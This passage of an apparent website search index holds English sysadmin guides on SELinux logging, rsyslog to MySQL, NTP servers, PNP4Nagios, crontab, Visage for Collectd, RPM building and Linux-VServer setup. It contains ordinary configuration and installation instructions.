root:\ntouch /autorelabel I Have a SELinux Problem and Nothing in My Logs linkI encountered this with Samba which was causing problems, but neither audit2allow nor logs showed anything. To solve this problem and see the log messages, tell it to log everything:\nsemanage dontaudit off Then you just need to check the logs (/var/log/audit/audit.log and /var/log/messages).\nResources linkSELinux, the Kernel Security Agency\n"
            }
        );
    index.add(
            {
                id:  382 ,
                href: "\/Rsyslog_:%C2%A0Installation_et_configuration_d%27Rsyslog\/",
                title: "Rsyslog: Installation and Configuration",
                description: "Guide to installing and configuring Rsyslog for log management, including server setup, templates, and client configuration",
                content: "Introduction linkSyslog is a standard for forwarding log messages in an IP network. The term “syslog” is often used for both the actual syslog protocol, as well as the application or library sending syslog messages.\nSyslog is a client/server protocol: the syslog sender sends a small (less than 1KB) textual message to the syslog receiver. The receiver is commonly called “syslogd”, “syslog daemon” or “syslog server”. Syslog messages can be sent via UDP and/or TCP.\nSyslog is typically used for computer system management and security auditing. While it has a number of shortcomings, syslog is supported by a wide variety of devices and receivers across multiple platforms. Because of this, syslog can be used to integrate log data from many different types of systems into a central repository.\nInstallation linkThere is nothing especially to do to install rsyslog as it is embedded in Debian.\nConfiguration linkAll configuration files are located into /etc/rsyslog.d/.\nBy default, all remote incoming logs are stored with the local logs of the rsyslog server (/var/log/syslog). If you want to redirect the incoming traffic in a MySQL database, you should update the configuration file with those lines:\n(/etc/rsyslog.conf):\n# /etc/rsyslog.conf Configuration file for rsyslog v3. # # For more information see # /usr/share/doc/rsyslog-doc/html/rsyslog_conf.html ################# #### MODULES #### ################# $ModLoad imuxsock # provides support for local system logging $ModLoad imklog # provides kernel logging support (previously done by rklogd) #$ModLoad immark # provides --MARK-- message capability # provides UDP syslog reception $ModLoad imudp $UDPServerRun 514 # provides TCP syslog reception $ModLoad imtcp $InputTCPServerRun 514 ########################### #### GLOBAL DIRECTIVES #### ########################### # # Use traditional timestamp format. # To enable high precision timestamps, comment out the following line. # $ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat # # Set the default permissions for all log files. # $FileOwner root $FileGroup adm $FileCreateMode 0640 $DirCreateMode 0755 # Load MySQL module $ModLoad ommysql # # Include all config files in /etc/rsyslog.d/ # $IncludeConfig /etc/rsyslog.d/*.conf ############### #### RULES #### ############### :hostname, !isequal, \"syslog1\" ~ \u0026 ~ # # First some standard log files. Log by facility. # auth,authpriv.* /var/log/auth.log # Additional things like Cisco syslog *.*;auth,authpriv.none,local4.none,local7.none,local6.none,local5.none -/var/log/syslog #cron.* /var/log/cron.log daemon.* -/var/log/daemon.log kern.* -/var/log/kern.log lpr.* -/var/log/lpr.log mail.* -/var/log/mail.log user.* -/var/log/user.log ############################################ # # Data Stored in the Mysql Database # # please refer to /etc/rsyslog.d/mysql.conf # ############################################ # # Logging for the mail system. Split it up so that # it is easy to write scripts to parse these files. # mail.info -/var/log/mail.info mail.warn -/var/log/mail.warn mail.err /var/log/mail.err # # Logging for INN news system. # news.crit /var/log/news/news.crit news.err /var/log/news/news.err news.notice -/var/log/news/news.notice # # Some \"catch-all\" log files. # *.=debug;\\ auth,authpriv.none;\\ # local4.none,local7.none,local6.none,local5.none;\\ news.none;mail.none -/var/log/debug *.=info;*.=notice;*.=warn;\\ auth,authpriv.none;\\ cron,daemon.none;\\ # local4.none,local7.none,local6.none,local5.none;\\ mail,news.none -/var/log/messages # # Emergencies are sent to everybody logged in. # *.emerg * # # I like to have messages displayed on the console, but only on a virtual # console I usually leave idle. # #daemon,mail.*;\\ # news.=crit;news.=err;news.=notice;\\ # *.=debug;*.=info;\\ # *.=notice;*.=warn /dev/tty8 # The named pipe /dev/xconsole is for the `xconsole' utility. To use it, # you must invoke `xconsole' with the `-file' option: # # $ xconsole -file /dev/xconsole [...] # # NOTE: adjust the list below, or you'll go crazy if you have a reasonably # busy site.. # daemon.*;mail.*;\\ news.err;\\ *.=debug;*.=info;\\ *.=notice;*.=warn The ‘-’ char in front of the log files name permit to bufferise before writing into file. Use it when a lot of informations has to be written in the logs!\nDefine a template linkA template is use to determine some action to take by the server syslog if this template is use. For example, the following template sendthe info into a mysql database name “my_server”. In the table “Message” will be send the syslog value propertie %msg% with a certain regex (we want to customize the message) and into the table “Facility” the syslog value propertie %syslogfacility%, etc…\n(/etc/rsyslog.d/servers_template):\n$template my_server,\"insert into `my_server` (Message, Facility, FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values ('%msg:R,ERE,1,FIELD:%\\[.*\\](.*)--end%', %syslogfacility%, '%fromhost%', '%syslogpriority%', '%timereported:::date-mysql%', '%timegenerated:::date-mysql%', %iut%, '%programname%')\",stdsql Explanations:\n$template my_server –\u003e we create a template named “my_server” insert into my_server –\u003e this template send to the “my_server” table stdsql –\u003e for “standard sql” Rsyslog is very flexible, we can make a lot a thing with the logs.This template can be applied to some remote incoming logs, wtih a lot of condition (if..then). For example:\nif $fromhost == '192.168.59.17' then :ommysql:127.0.0.1,syslog-sys,rsyslog,password;my_server local7.* :ommysql:127.0.0.1,syslog-sys,rsyslog,password;my_server if $syslogfacility-text == 'local4' then :ommysql:127.0.0.1,syslog-sys,rsyslog,password;my_server It’s possible to use “and” or “and not”\nif $syslogfacility-text == 'local4' and $fromhost == '192.168.79.17' and not ($syslogtag contains '%ASA-4-106023:' and $msg contains 'src inside:10.101') then :ommysql:127.0.0.1,syslog-sys,rsyslog,password;my_server Explanations:\n:ommysql –\u003e send to a mysql server 127.0.0.1 –\u003e ip of the mysql server syslog-sys –\u003e name of the database rsyslog –\u003e username password –\u003e password my_server –\u003e the template to use for these conditions. “$syslogfacility-text” or “$fromhost” are called “property replacer”, here is the list of the possible replacer: http://www.rsyslog.com/doc/property_replacer.html\nIt’s possible to use some filters, with this nomeclature:\n:property, [!]compare-operation, \"value\" destination For example, this line send all the logs which are not send from the “syslog” server to /var/logs/remotelogs\n:hostname, !isequal, \"syslog\" /var/logs/remotelogs \u0026~ the tilde character is mandatory for applying the condition. This line will drop all remote logs (so they won’t be write on a local file), but if the logs match a condition with a mysql database, they will be send to the database:\n:hostname, !isequal, \"syslog\" ~ \u0026 ~ This line send all the logs from 192.0.2.* to a file:\nif $fromhost-ip startswith '192.0.2.' then /var/log/network2.log The possibles “compare-operation” are:\nCompare-operation Effect contains Checks if the string provided in value is contained in the property. There must be an exact match, wildcards are not supported. isequal Compares the “value” string provided and the property contents. These two values must be exactly equal to match. The difference to contains is that contains searches for the value anywhere inside the property value, whereas all characters must be identical for isequal. As such, isequal is most useful for fields like syslogtag or FROMHOST, where you probably know the exact contents. startswith Checks if the value is found exactly at the beginning of the property value. For example, if you search for “val” with:msg, startswith, “val” it will be a match if msg contains “values are in this message” but it won’t match if the msg contains “There are values in this message” (in the later case, contains would match). Please note that “startswith” is by far faster than regular expressions. So even once they are implemented, it can make very much sense (performance-wise) to use “startswith”. regex Compares the property against the provided POSIX BRE regular expression. ereregex Compares the property against the provided POSIX ERE regular expression. Client Configuration linkOn unix computers, the standard syslog daemon is generally used. To send the logs on a remote server, you have to add the following line for udp connections:\n(/etc/rsyslog.conf):\n*.* @remote-syslog-server or for tcp connections:\n(/etc/rsyslog.conf):\n*.* @@remote-syslog-server where remote-syslog-server is the name or address of your syslog servers. To test, you can use logger command to valid everythings is OK:\nlogger test "
            }
        );
    index.add(
            {
                id:  383 ,
                href: "\/NTP_:_Cr%C3%A9ation_d%27un_serveur_NTP\/",
                title: "NTP: Creating an NTP Server",
                description: "Guide for setting up and configuring an NTP server on various operating systems including Debian and Solaris.",
                content: "Introduction linkThe NTP server is a time server. It provides time based on atomic clock references.\nInstallation linkDebian linkSuper quick:\napt-get install ntp Solaris linkOn Solaris, NTP is normally installed by default. Otherwise, search for packages containing ntpd. You will need to copy the server configuration file:\ncp /etc/inet/ntp.server /etc/inet/ntp.conf Configuration linkHere is some information before diving into configuration files:\nstratum: indicates that it’s not very reliable data 127.127.1.0: time given by the machine (BIOS) peer: defines a server of the same stratum as the server (same level/same geographic location), which allows for more reliability. Using 1 server + peers provides a more refined configuration than having only geographically distant servers. Debian linkHere’s the configuration file for a time server (/etc/inet/ntp.conf):\n# /etc/ntp.conf, configuration for ntpd # ntpd will use syslog() if logfile is not defined logfile /var/log/ntpd driftfile /var/lib/ntp/ntp.drift statsdir /var/log/ntpstats/ statistics loopstats peerstats clockstats filegen loopstats file loopstats type day enable filegen peerstats file peerstats type day enable filegen clockstats file clockstats type day enable # Servers to use to update server 0.fr.pool.ntp.org prefer server 1.fr.pool.ntp.org server 2.fr.pool.ntp.org # ... and use the local system clock as a reference if all else fails server 127.127.1.0 # fudge 127.127.1.0 stratum 13 # Local users may interrogate the ntp server more closely. restrict 127.0.0.1 # Allow local network to synchronize to this server restrict 192.168.0.0 mask 255.255.255.0 nomodify notrap broadcastdelay 0.008 After configuring and restarting the service, you must wait a few minutes for the server to synchronize.\nSolaris linkHere’s the configuration file for Solaris (/etc/inet/ntp.conf):\n# # Copyright 1996-2003 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # /etc/inet/ntp.server # # An example file that could be copied over to /etc/inet/ntp.conf and # edited; it provides a configuration template for a server that # listens to an external hardware clock, synchronizes the local clock, # and announces itself on the NTP multicast net. # # This is the external clock device. The following devices are # recognized by xntpd 3-5.93e: # # XType Device RefID Description # ------------------------------------------------------- # 1 local LCL Undisciplined Local Clock # 2 trak GPS TRAK 8820 GPS Receiver # 3 pst WWV PSTI/Traconex WWV/WWVH Receiver # 4 wwvb WWVB Spectracom WWVB Receiver # 5 true TRUE TrueTime GPS/GOES Receivers # 6 irig IRIG IRIG Audio Decoder # 7 chu CHU Scratchbuilt CHU Receiver # 8 parse ---- Generic Reference Clock Driver # 9 mx4200 GPS Magnavox MX4200 GPS Receiver # 10 as2201 GPS Austron 2201A GPS Receiver # 11 arbiter GPS Arbiter 1088A/B GPS Receiver # 12 tpro IRIG KSI/Odetics TPRO/S IRIG Interface # 13 leitch ATOM Leitch CSD 5300 Master Clock Controller # 15 * * TrueTime GPS/TM-TMD Receiver # 17 datum DATM Datum Precision Time System # 18 acts ACTS NIST Automated Computer Time Service # 19 heath WWV Heath WWV/WWVH Receiver # 20 nmea GPS Generic NMEA GPS Receiver # 22 atom PPS PPS Clock Discipline # 23 ptb TPTB PTB Automated Computer Time Service # 24 usno USNO USNO Modem Time Service # 25 * * TrueTime generic receivers # 26 hpgps GPS Hewlett Packard 58503A GPS Receiver # 27 arc MSFa Arcron MSF Receiver # # * All TrueTime receivers are now supported by one driver, type 5. # Types 15 and 25 will be retained only for a limited time and may # be reassigned in future. # # Some of the devices benefit from \"fudge\" factors. See the xntpd # documentation. # Either a peer or server. Replace \"XType\" with a value from the # table above. # Servers to use to update server 0.fr.pool.ntp.org prefer server 1.fr.pool.ntp.org server 2.fr.pool.ntp.org # fudge 127.127.XType.0 stratum 0 broadcast 224.0.1.1 ttl 4 enable auth monitor driftfile /var/ntp/ntp.drift statsdir /var/ntp/ntpstats/ filegen peerstats file peerstats type day enable filegen loopstats file loopstats type day enable filegen clockstats file clockstats type day enable keys /etc/inet/ntp.keys trustedkey 0 requestkey 0 controlkey 0 Create a drift file as indicated in the configuration:\ntouch /etc/inet/ntp.drift Then enable the service:\nsvcadm enable svc:/network/ntp:default NTP Clients linkLinux linkTo synchronize a Unix/Linux machine, use this command:\nntpdate my_time_server Solaris linkIt’s quite simple on Solaris:\ncp /etc/inet/ntp.client /etc/inet/ntp.conf svcadm enable svc:/network/ntp:default Windows linkFrom a Windows machine:\nnet time /setsntp:my_time_server net time /querysntp net stop w32time \u0026\u0026 net start w32time FAQ linkHow to change the timezone? linkOn Debian, there’s the tzconfig command! It’s very practical:\ntzconfig If this doesn’t work, try:\ndpkg-reconfigure tzdata “no server suitable for synchronization found” linkIf you encounter this error, there could be two reasons:\nYour NTP server needs to synchronize before it can provide time to other servers. This can sometimes take some time (~30 min). One of the servers in your list is unreachable, which makes your server unavailable for updates. Comment it out temporarily. Once the following line appears in the logs (“clock is now synced”), everything is OK:\nMay 24 16:48:05 chronos ntpd[14262]: ntp engine ready May 24 16:48:24 chronos ntpd[14262]: peer 91.121.45.45 now valid May 24 16:48:24 chronos ntpd[14262]: peer 81.93.183.116 now valid May 24 16:48:27 chronos ntpd[14262]: peer 94.23.220.143 now valid May 24 17:27:13 chronos ntpd[14262]: clock is now synced "
            }
        );
    index.add(
            {
                id:  384 ,
                href: "\/PNP4Nagios:_Grapher_ses_alertes_Nagios\/",
                title: "PNP4Nagios: Graph Your Nagios Alerts",
                description: "Guide to install and configure PNP4Nagios to generate graphs from Nagios performance data",
                content: " Introduction linkPNP is an addon to Nagios which analyzes performance data provided by plugins and stores them automatically into RRD-databases (Round Robin Databases, see RRD Tool).\nPrerequisites linkFirst, create a folder where to unzip the installation files. Here, we are going to use /etc/nagios3/pnp4nagios:\nmkdir /etc/nagios3/pnp4nagios cd /etc/nagios3/pnp4nagios Then get the file, unzip and go into the folder:\nwget http://downloads.sourceforge.net/project/pnp4nagios/PNP-0.6/pnp4nagios-0.6.0.tar.gz?use_mirror=freefr cd pnp4nagios-0.6.0 Activate the Apache2 rewrite module:\na2enmod rewrite /etc/init.d/apache2 restart Edit the php5 conf file in /etc/php5 on this line:\nmagic_quotes_gpc = Off If not installed yet, install GCC (C compiler)\naptitude install gcc Installation linkConfigure the installation, using the folder you want to install pnp4nagios in:\n./configure --prefix=/etc/nagios3/pnp4nagios --with-nagios-user=nagios --with-nagios-group=nagios Launch every make command:\nmake all make install make install-webconf make install-config make install-init Configuration linkIn the nagios generic services file add:\n... define command { command_name process-service-perfdata command_line /usr/bin/perl /usr/local/pnp4nagios/libexec/process_perfdata.pl } And in the generic hosts file add:\ndefine command { command_name process-host-perfdata command_line /usr/bin/perl /usr/local/pnp4nagios/libexec/process_perfdata.pl -d HOSTPERFDATA } Edit the nagios.cfg file and be sure those line are uncommented:\nprocess_performance_data=1 service_perfdata_command=process-service-perfdata host_perfdata_command=process-host-perfdata In any service or host configuration file, add (use generic-*.cfg for example):\ndefine host { name host-pnp action_url /pnp4nagios/index.php/graph?host=$HOSTNAME$\u0026srv=_HOST_' class='tips' rel='/pnp4nagios/index.php/popup?host=$HOSTNAME$\u0026srv=_HOST_ register 0 } define service { name srv-pnp action_url /pnp4nagios/index.php/graph?host=$HOSTNAME$\u0026srv=$SERVICEDESC$' class='tips' rel='/pnp4nagios/index.php/popup?host=$HOSTNAME$\u0026srv=$SERVICEDESC$ register 0 } Now for any host and service you want to use pnp4nagios with, on its “use” line, add this for a host:\nhost-pnp and for a service:\nsrv-pnp Example:\n... define service{ use generic-services,srv-pnp You can add it on a generic host or service used by a group of hosts or services. This will be inherited.\nOnmouseover graphs in cgi interface linkCopy the ssi files in the pnp4nagios contrib folder (pnp4nagios-0.6.0/contrib/ssi/*) in the nagios ssi folder (/usr/share/nagios3/htdocs/ssi/):\ncp -Rf /etc/nagios3/pnp4nagios/pnp4nagios-0.6.0/contrib/ssi/*.ssi /usr/share/nagios3/htdocs/ssi/ rm -Rf /etc/nagios3/pnp4nagios/pnp4nagios-0.6.0/ Finally, restart apache2 and nagios and everything will work fine. You can see the PNP4Nagios interface to: http://nagios-srv/pnp4nagios\n"
            }
        );
    index.add(
            {
                id:  385 ,
                href: "\/Crontab_:_utilisation\/",
                title: "Crontab: Usage",
                description: "Guide on how to use crontab for scheduling automated tasks on Linux systems",
                content: "Introduction linkIn short: crontab is used to execute periodic tasks automatically. In detail: crond is a daemon that runs on most Linux distributions and manages certain periodic tasks. A cronjob is a periodic task defined by the user, which will be executed by the system (or predefined by the authors of the Linux distribution you’re using).\nLet’s consider a simple example: we want to send ourselves the same email every morning…\nMoi@machine:~$ echo \"Life is beautiful!\" At this stage, we’re only at the drafting stage of the email and nothing is automated yet. To automate a task, you need to indicate it to cron in specific files called “crontabs”; each user has a crontab that they manage as they wish. To access your crontab, type:\n~$ crontab -e A command line in this file consists of 6 fields, separated by spaces or tabs, in this order:\nThe syntax of the fields may appear differently depending on your distribution; for example, you might find jj or dom (day of month) for the day of the month, mon for month, etc. Multiple elements in the same field are separated by a comma (e.g., 1,3,5 in the month field means “January, March, May”); similarly, a range is expressed by a hyphen (e.g., 1-3 for the day of the week means “Monday to Wednesday”); an asterisk (*) designates the largest possible interval.\nIn our example, if we want to send ourselves an email every day at 8:01 AM, we’d type:\n01 8 * * * echo \"Life is beautiful!\" If we want to execute a script on the first day of every month at 5:42 AM:\n42 5 1 * * monscript.sh Or make a backup Monday through Friday, every day at 11:59 AM:\n59 11 * * 1-5 backup.sh The primary purpose of cron is actually to manage system administration tasks. Since these are generally repetitive, it’s quite useful to have such a task management system at your disposal… The main configuration file for cron is usually /etc/crontab. There’s a small difference with the syntax of user crontabs; since this command file is executed as root, there’s an option to specify a user other than root for executing scheduled tasks.\nThe syntax of the commands is therefore as follows:\nminutes hours day-of-month month day-of-week user command\nFor example:\n7 20 * * * root echo \"This command is executed every day as root at 8:07 PM\" 7 20 * * * bob echo \"This command is executed every day by user bob at 8:07 PM\" The rest of the syntax should be familiar to you now.\nControlling Cron Usage linkThe use of cron can lead to mobilization of system resources, particularly if administrative tasks are heavy and numerous (e.g., 50 users having set up a cronjob that runs every minute can use up quite a bit of system resources…). To avoid this, cron integrates usage authorization management. Two files are used: /etc/cron.deny and /etc/cron.allow.\nThe syntax is very simple and identical to other daemons that work with .allow and .deny files: to prohibit a particular user from using cron, simply enter their name in the cron.deny file. For example:\n~$ echo \"bob\" \u003e\u003e /etc/cron.deny This will simply prohibit bob from using cron. To only authorize certain specifically designated users, enter the command:\n~$ echo \"ALL\" \u003e\u003e /etc/cron.deny \u0026\u0026 echo \"bob\" \u003e\u003e /etc/cron.allow … and only bob will be authorized to use cron.\nNote: if neither of the two files exists, only the super user (root) will have the right to use cron. Additionally, an empty /etc/cron.deny file means that all users can use cron.\nThe crond process is normally launched at system startup. To verify this:\n~$ ps aux Good, it seems to be running! You can also view it in the graphical service manager of your desktop environment. If the service is not started, check the corresponding box (via the graphical interface) or enter the command: /etc/rc.d/init.d/crond start or /etc/init.d/crond start or even /etc/init.d/cron start (depending on the distribution used…).\nBacking Up the Crontab linkI’ve been looking for this folder for a long time!!! There’s a folder where all user crontabs are stored:\n/var/spool/cron/crontabs\nAnd for daily / hourly / monthly… it’s in this folder:\n/etc/cron.d\nConfiguring Email for a Crontab linkIf you want a crontab to redirect all output to a specific address, add this line:\nMAILTO=\"user@fqdn\" "
            }
        );
    index.add(
            {
                id:  386 ,
                href: "\/Visage_:_Une_interface_web_pour_Collectd\/",
                title: "Visage: A Web Interface for Collectd",
                description: "A guide for installing and configuring Visage, a web interface for Collectd that allows visualization and comparison of collected metrics.",
                content: "Introduction linkVisage is currently the best interface for Collectd. It still needs many new features, but at present it’s a superb interface that allows comparative analysis between metrics.\nInstallation linkOn Debian, we’ll install the prerequisites:\naptitude install build-essential librrd-ruby ruby ruby-dev rubygems libsinatra-ruby collectd Then via gem (as it’s not currently packaged), we’ll install it:\ngem install visage-app Launching linkTo launch it, it’s very simple:\n$(dirname $(dirname $(gem which visage-app)))/bin/visage-app start or\n/var/lib/gems/1.8/gems/visage-app-0.9.4/bin/visage-app start Which will show you this:\n_ ___ | | / (_)________ _____ ____ | | / / / ___/ __ `/ __ `/ _ \\ | |/ / (__ ) /_/ / /_/ / __/ |___/_/____/\\__,_/\\__, /\\___/ /____/ will be running at http://nala.deimos.fr:9292/ Looking for RRDs in /var/lib/collectd/rrd [2011-04-23 19:19:14] INFO WEBrick 1.3.1 [2011-04-23 19:19:14] INFO ruby 1.8.7 (2010-08-16) [x86_64-linux] [2011-04-23 19:19:14] INFO WEBrick::HTTPServer#start: pid=5409 port=9292 No further explanation needed, just connect to the web interface indicated.\nAutomatic Host Updates linkAs of this writing, host profiles are not automatically created in Visage as they might be in competing interfaces. I’m not sure if this is intentional or a missing feature.\nWhatever the reason, I have so many hosts and add so many that I need it automated, which is why I created a small script that updates my Visage profiles:\n#!/bin/sh # Visage Update Profiles # This script will automatically update visage to profile to match with current available rrd graphs # Made by Pierre Mavro # Config folders and files visage_profile_yaml='/usr/lib/ruby/gems/1.8/gems/visage-app-0.9.4/lib/visage-app/config/profiles.yaml' collectd_rrd='/var/lib/collectd/rrd' ############# DO NOT EDIT ############# cd $collectd_rrd echo \"--- \" \u003e $visage_profile_yaml for profile in `find . -maxdepth 1 -mindepth 1 -type d` ; do profile=`echo \"$profile\" | sed \"s/\\.\\///g\"` profile_lower=`echo \"$profile\" | tr \"[:upper:]\" \"[:lower:]\"` profile_yaml=`echo \"$profile_lower\" | sed \"s/-/+/g\"` cat \u003c\u003e$visage_profile_yaml $profile_yaml: :url: $profile_yaml :profile_name: $profile_lower :hosts: $profile :metrics: \"*\" EOT done You only need to modify the first two parameters to make it work on your platform (default is for Debian Squeeze) and add it to crontab if you want it periodically updated.\nReferences linkhttp://auxesis.github.com/visage/\n"
            }
        );
    index.add(
            {
                id:  387 ,
                href: "\/RPM_:_Build_a_binary_RPM_package_from_sources_on_Red_Hat\/",
                title: "RPM: Build a Binary RPM Package from Sources on Red Hat",
                description: "Guide on how to build a binary RPM package from source files on Red Hat systems, including compilation and packaging steps.",
                content: "Introduction linkBuilding an RPM is not a complicated task, even from source files. In my job I had to compile Open On Load kernel module and package it.\nThe problem is when you want to deploy this kernel module on several production servers and you don’t want to have all development tools installed on all production servers. This is the documentation I’ve made to create RPMs with binaries from sources.\nCompilation linkIt is better to test compilation before trying to package it (just to be sure it works).\nSo you need to have a Red Hat with development tools installed to compile Open On Load module:\nyum groupinstall \"Development Tools\" Now we can compile:\nwget http://www.openonload.org/download/openonload-201104.tgz tar -xzf openonload-201104.tgz rm -f openonload-201104.tgz cd openonload-201104 ./scripts/onload_install Create package linkNow let’s build a binary RPMS from the source RPM:\ncd .. tar -cf openonload-201104.tgz openonload-201104 rpmbuild -ts openonload-201104.tgz cd /root/rpmbuild/SRPMS/ rpmbuild --rebuild openonload-201104-1.src.rpm You now have got packages in /root/rpmbuild/RPMS/x86_64/ and can deploy them without any development packages on production servers.\n"
            }
        );
    index.add(
            {
                id:  388 ,
                href: "\/VServer_:_Mise_en_place_de_VServer\/",
                title: "VServer: Setting Up VServer",
                description: "A guide on setting up and managing VServer for server virtualization on Linux systems, including creation, management, networking, and troubleshooting.",
                content: "Introduction linkLinux-VServer is a security context isolator combined with segmented routing, chroot, extended quotas, and other standard tools.\nInitially launched by Jacques Gélinas as the CTX patch, Linux-VServer consists of a patch for the Linux kernel that allows multiple applications to run in different security contexts on the same host machine. Linux-VServer is also equipped with a set of tools to install/manage these contexts.\nThis project allows one or more operating environments (operating systems without the kernel) to run on a distribution, meaning you can run one or more distributions on a single distribution.\nLinux-VServer is a much more advanced virtualization solution than simple chroot.\nNot to be confused with the Linux Virtual Server Project.\nExperience Feedback linkVServer is an excellent product for applications that don’t require many simultaneous network connections. In terms of CPU/RAM, I’ve never encountered any particular issues. The real peculiarities are on the network side. For example, a Nagios will struggle with more than 800 checks, or a MySQL replication might not function correctly, etc.\nVServer remains a major asset but should be used for specific needs without heavy network load.\nInstallation linkInstall the minimum requirements:\napt-get install linux-image-vserver-686 util-vserver vserver-debiantools ssh Now reboot on the new kernel.\nCreating a VServer linkCreate the folder where your VServer will be installed and enter it:\nmkdir -p /home/deimos/vserver/vservertest \u0026\u0026 cd /home/deimos/vserver/ Create a VServer like this:\nnewvserver --vsroot $(pwd) --hostname vservertest --domain mydomain.local --ip 192.168.0.70/24 --dist etch --mirror http://ftp.fr.debian.org/debian --interface eth0 Note: use dummy0 if you have configured a dummy interface!\nvsroot - by default in /var/lib/vservers, this is where the vserver will be installed Hostname - the name of the vserver Domain - the domain of the vserver (like that of the machine) IP Address - the IP address of the vserver CIDR Range - the CIDR (subnet mask) Dist - the distribution to use Debian Mirror - the Debian mirror Interface - the network interface to use (eth0 by default on most systems) VServer Management linkTo start a VServer and connect to it:\nvserver vservertest start; vserver vservertest enter Here are the basic options:\nStart a vserver: vserver vserver_name start Stop a vserver: vserver vserver_name stop Restart a vserver: vserver vserver_name restart Enter a vserver shell: vserver vserver_name enter Memory Limits linkA vserver kernel keeps track many resources used by each guest (context). Some of these relate to memory usage by the guest. You can place limits on these resources to prevent guests from using all the host memory and making the host unusable.\nTwo resources are particularly important in this regard:\nThe Resident Set Size (rss) is the amount of pages currently present in RAM. The Address Space (as) is the total amount of memory (pages) mapped in each process in the context. Both are measured in pages, which are 4 kB each on Intel machines (i386). So a value of 200000 means a limit of 800,000 kB, a little less than 800 MB.\nEach resource has a soft and a hard limit.\nIf a guest exceeds the rss hard limit, the kernel will invoke the Out-of-Memory (OOM) killer to kill some process in the guest. The rss soft limit is shown inside the guest as the maximum available memory. If a guest exceeds the rss soft limit, it will get an extra “bonus” for the OOM killer (proportional to the oversize). If a guest exceeds the as hard limit, memory allocation attempts will return an error, but no process is killed. The as soft limit is not utilized until now. In the future it may be used to penalize guests over that limit or it could be used to force swapping on them and such… Bertl explained the difference between rss and as with the following example. If two processes share 100 MB of memory, then only 100 MB worth of virtual memory pages can be used at most, so the RSS use of the guest increases by 100 MB. However, two processes are using it, so the AS use increases by 200 MB.\nThis makes me think that limiting AS is less useful than limiting RSS, since it doesn’t directly reflect real, limited resources (RAM and swap) on the host, that deprive other virtual machines of those resources. Bertl says that AS limits can be used to give guests a “gentle” warning that they are running out of memory, but I don’t know how much more gentle it is, or how to set it accurately.\nFor example, 100 processes each mapping a 100 MB file would consume a total of 10 GB of address space (AS), but no more than 100 MB of resources on the host. But if you set the AS limit to 10 GB, then it will not stop one process from allocating 4 GB of RAM, which could kill the host or result in that process being killed by the OOM killer.\nYou can set the hard limit on a particular context, effective immediately, with this command:\n/usr/sbin/vlimit -c -- is the context ID of the guest, which you can determine with the /usr/sbin/vserver-stat command.\nFor example, if you want to change the rss hard limit for the vserver with 49000, and limit it to 10,000 pages (40 MB), you could use this command:\n/usr/sbin/vlimit -c 49000 --rss 10000 You can change the soft limit instead by adding the -S parameter.\nChanges made with the vlimit command are effective only until the vserver is stopped. To make permanent changes, write the value to this file:\n/etc/vservers//rlimits/.hard To set a soft limit, use the same file name without the .hard extension. The rlimits directory is not created by default, so you may need to create it yourself.\nChanges to these files take effect only when the vserver is started. To make immediate and permanent changes to a running vserver, you need to run vlimit and update the rlimits file.\nThe safest setting, to prevent any guest from interfering with any other, is to set the total of all RSS hard limits (across all running guests) to be less than the total virtual memory (RAM and swap) on the host. It should be sufficiently less to leave room for processes running on the host, and some disk cache, perhaps 100 MB.\nHowever, this is very conservative, since it assumes the worst case where all guests are using the maximum amount of memory at one time. In practice, you can usually get away with contended resources, i.e. allowing guests to use more than this value.\nNetwork linkTo configure vservers to have distinct IP addresses, modify the /etc/network/interfaces file of the main host:\n# The loopback network interface auto lo bond0 dummy0 iface lo inet loopback # Bonding interface iface bond0 inet static address 192.168.0.98 netmask 255.255.255.0 gateway 192.168.0.248 network 192.168.0.0 up ifenslave bond0 eth0 eth1 down ifenslave -d bond0 eth0 eth1 # Vserver interface iface dummy0 inet static address 192.168.0.10 netmask 255.255.255.0 Then restart the network:\n/etc/init.d/network restart Now create a vserver and enter dummy0 as the interface:\nnewvserver --vsroot $(pwd) --hostname hostname --domain mydomain.local --ip 192.168.0.12/24 --dist lenny --mirror http://ftp.fr.debian.org/debian --interface dummy0 Then add a name file containing the last number of the IP you assigned to:\necho 12 \u003e /etc/vservers/hostname/interfaces/0/name Start your vserver and if you do an ifconfig, you should have something like this:\ndummy0 Lien encap:Ethernet HWaddr 22:22:xx:xx:CF:xx UP BROADCAST RUNNING NOARP MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:3 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 lg file transmission:0 RX bytes:0 (0.0 b) TX bytes:210 (210.0 b) dummy0:12 Lien encap:Ethernet HWaddr 22:22:xx:xx:CF:xx inet adr:192.168.0.12 Bcast:192.168.0.255 Masque:255.255.255.0 UP BROADCAST RUNNING NOARP MTU:1500 Metric:1 Binding linkImportant: If you want to install software that runs on a port already in use by another vserver, try to bind to the address of the corresponding server. Ex: with ssh, edit the /etc/ssh/sshd_config file and specify the bind with the IP of the current vserver.\nHere is a table of Applications with configuration files to modify for Binding:\nApplication Config File Line OpenSSH /etc/ssh/sshd_config ListenAddress 192.168.0.12 Postgresql /etc/postgresql/8.1/main/postgresql.conf listen_addresses = ‘192.168.0.12’ Apache2 /etc/apache2/ports.conf Listen 192.168.0.12:80 Munin /etc/munin/munin-node.conf host 192.168.0.12 Tomcat5.5 /etc/tomcat5.5/server.xml MySQL /etc/mysql/my.cnf bind-address = 192.168.0.12 Postfix /etc/postfix/main.cf inet_interfaces = 192.168.0.12 Lighttpd /etc/lighttpd/lighttpd.conf server.bind = “192.168.0.12” Nagios NRPE /etc/nagios/nrpe.cfg server_address=192.168.0.12 NFS Mounting linkFor security reasons, we cannot mount NFS shares by default. To bypass this security, simply create a file called “bcapabilities” in the configuration of the vserver in question:\necho \"CAP_SYS_ADMIN\" \u003e /etc/vservers/my_vserver/bcapabilities Then restart your vserver and you will have the ability to mount NFS shares :-)\nYou may encounter connection problems because you haven’t specified the main VServer machine:\nmount: block device backuppc:/mnt/backups/disk_array0/intranet is write-protected, mounting read-only mount: cannot mount block device backuppc:/mnt/backups/disk_array0/intranet read-only Edit the /etc/export file on the server:\n/mnt/backups/disk_array0/intranet Main_Server_IP(sync,insecure,rw,no_root_squash) Vserver_IP(sync,insecure,rw,no_root_squash) VPS linkHere’s a kind of ps but for VServer:\n# vps -ef root 8102 0 MAIN 8100 0 12:40 pts/1 00:00:00 -bash root 8210 49159 ns0 5542 0 12:49 ? 00:00:00 sshd: root@pts/2 root 8212 49159 ns0 